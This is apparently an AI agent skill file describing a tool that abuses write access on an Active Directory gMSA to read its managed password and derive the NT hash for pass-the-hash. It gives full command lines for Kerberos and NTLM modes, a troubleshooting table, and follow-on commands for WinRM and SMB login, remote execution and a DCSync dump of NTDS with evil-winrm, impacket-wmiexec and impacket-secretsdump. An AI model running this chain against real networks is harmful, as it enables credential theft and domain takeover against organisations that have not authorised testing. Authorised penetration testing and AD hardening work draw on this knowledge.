---
description: "Convert write access on a gMSA's msDS-GroupMSAMembership into that gMSA's NT hash, ready for Pass-the-Hash. Use when BloodHound shows a GenericWrite/GenericAll/WriteDACL edge from a principal you control to a gMSA, OR when a user enum reveals a `$`-suffixed sAMAccountName + you can write its SD. Provides the SD-build → LDAP-write → re-read-blob → MD4 → NT hash primitive. Does NOT assume what you do with the hash afterwards (WinRM / SMB / constrained delegation etc. are all downstream choices)."
---

# /gmsa-takeover — gMSA password read abuse

**Purpose**: One-shot tool for the "I have write perm on a gMSA, now give me its NT hash" pattern.

## When to invoke

- BloodHound shows you (or a principal whose TGT you hold) have `GenericWrite`, `GenericAll`, or `WriteDACL` on an object that:
  - Has `objectClass: msDS-GroupManagedServiceAccount`, **OR**
  - Has `sAMAccountName` ending in `$` (computer/gMSA account)
- You want that account's NT hash to reuse via WinRM PtH, SMB PtH, AS-REP or S4U.

## When to skip

- Target is a regular user (no gMSA) — use `Shadow Credentials` or password reset instead
- You already have the NT hash (e.g. from secretsdump) — just use it
- Attacker principal is in **Protected Users** — must use Kerberos mode (`--kerberos` flag)

## The primitive (don't memorize — read it when you need it)

`scripts/gmsa_takeover.py` does three things:

1. Build a **self-relative Security Descriptor** where DACL = `ALLOW (FullControl) to <your-sid>`
2. LDAP `MODIFY_REPLACE` on `msDS-GroupMSAMembership` — writes that SD into the attribute
3. Re-bind LDAP, read `msDS-ManagedPassword`, parse MSDS-MANAGEDPASSWORD_BLOB, compute `MD4(current_password_utf16le)` → NT hash

## Usage

### Kerberos mode (attacker is Protected Users, e.g. svc_* accounts)

```bash
# Prereq: kinit got you a TGT, ccache is /tmp/krb5cc_0 or KRB5CCNAME points to it
export KRB5CCNAME=/tmp/krb5cc_0

python3 /path/to/skill/scripts/gmsa_takeover.py \
  --dc dc01.example.com \
  --gmsa-dn "CN=svc_gmsa,CN=Managed Service Accounts,DC=example,DC=com" \
  --principal-sid "S-1-5-21-XXX-YYY-ZZZ-1104" \
  --kerberos
```

### NTLM mode (attacker not protected)

```bash
python3 gmsa_takeover.py \
  --dc dc01.example.com \
  --gmsa-dn "CN=svc_gmsa,..." \
  --principal-sid "S-1-5-21-...-1104" \
  --user alice --password 'Passw0rd!' --domain example.com
```

Output: `/tmp/<sam>_nt.txt` contains the hash, and stdout shows `[+] <sam>$ NT hash = <32 hex>`.

## How to find the inputs

- **`--gmsa-dn`**: `nxc ldap <DC> -u U -p P --gmsa` lists gMSA accounts; get full DN via `ldapsearch -D ... -b "DC=..." "(sAMAccountName=<name>)"`
- **`--principal-sid`**: The SID of whoever's TGT/ccred you hold. From BloodHound-Python's `*_users.json` → `ObjectIdentifier`, or `nxc ldap ... --users` → RID then full SID.
- **`--dc`**: FQDN preferred (Kerberos SPN derivation). If Kerberos fails, retry with IP + `udp_preference_limit=1` + MTU 1200.

## Common failures

| Symptom | Cause | Fix |
|---|---|---|
| `KRB5CCNAME not set` | forgot `export` | `export KRB5CCNAME=/tmp/krb5cc_0` |
| `bind failed invalidCredentials data 52f` | Protected Users + NTLM mode | use `--kerberos` |
| `modify failed insufficientAccessRights` | you don't have write on this attr | re-check BloodHound edge |
| `msDS-ManagedPassword still empty` | SD write took but ACL cache lag | rerun after 30 sec |
| hangs forever, no output | Kerberos TGS fragment | `ip link set tun0 mtu 1200` |

## Downstream usage hints (not the skill's job)

Once you have the hash:
```bash
# WinRM (if gMSA in Remote Management Users)
nxc winrm <IP> -u '<gmsa>$' -H <HASH> -X 'whoami'
evil-winrm -i <IP> -u '<gmsa>$' -H <HASH>

# SMB admin access (if gMSA in local Administrators)
nxc smb <IP> -u '<gmsa>$' -H <HASH> -x 'whoami'
impacket-wmiexec -hashes :<HASH> 'domain/<gmsa>$@IP'

# Dump NTDS (if gMSA has DCSync)
impacket-secretsdump -hashes :<HASH> 'domain/<gmsa>$@IP'
```

## Flexibility reminder

Every gMSA scenario differs. The primitive handles SD-write + hash-derive. Everything else (which DN, which SID, how to use the hash) is your call. Don't follow this skill as a fixed pipeline — it's one lego brick.
